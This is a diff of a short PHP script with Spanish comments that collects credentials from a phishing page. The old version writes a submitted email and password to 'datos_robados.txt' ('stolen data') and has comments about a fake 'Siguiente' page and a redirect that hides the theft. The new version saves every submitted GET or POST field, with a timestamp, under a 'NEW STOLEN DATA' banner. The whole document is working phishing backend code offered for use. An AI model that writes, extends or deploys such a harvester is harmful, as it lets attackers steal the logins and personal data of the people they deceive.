@@ -1,23 +1,27 @@
 <?php
-// procesar.php
+// recibe_datos.php
 
-// Si se recibe un POST (cuando el usuario hace clic en "Siguiente" en el HTML)
-if ($_SERVER["REQUEST_METHOD"] == "POST") {
-    $email = $_POST['email'];
-    $password = $_POST['password'];
+// Si vienen datos por GET o POST
+if ($_SERVER['REQUEST_METHOD'] === 'POST' || !empty($_GET)) {
     
-    // Guardamos en un archivo de texto (si no usas base de datos)
-    $file = fopen("datos_robados.txt", "a");
-    fwrite($file, "Email: $email | Password: $password\n");
-    fclose($file);
-    
-    // IMPORTANTE: NO redirigimos aquí todavía.
-    // El HTML solo muestra los datos y espera a que el usuario haga clic en "Confirmar".
-    // Redirigimos desde el JavaScript del HTML para dar el efecto de carga.
-    
-    // Si querés que el PHP redirija *inmediatamente* después de guardar (sin esperar a la tarjeta), 
-    // descomentá la línea de abajo:
-    // header("Location: https://www.google.com");
-    // exit();
+    // Recopilar todos los datos
+    $data = $_POST;
+    if (empty($data)) {
+        $data = $_GET;
+    }
+
+    if (!empty($data)) {
+        // Formatear los datos para guardarlos
+        $output = "=== NUEVOS DATOS ROBADOS ===\n";
+        foreach ($data as $key => $value) {
+            $output .= "$key: $value\n";
+        }
+        $output .= "===========================\n";
+        $output .= "Fecha: " . date('Y-m-d H:i:s') . "\n\n";
+
+        // Guardar en un archivo de texto (datos_robados.txt)
+        // Asegúrate de que el hosting tenga permisos de escritura
+        file_put_contents('datos_robados.txt', $output, FILE_APPEND | LOCK_EX);
+    }
 }
 ?>
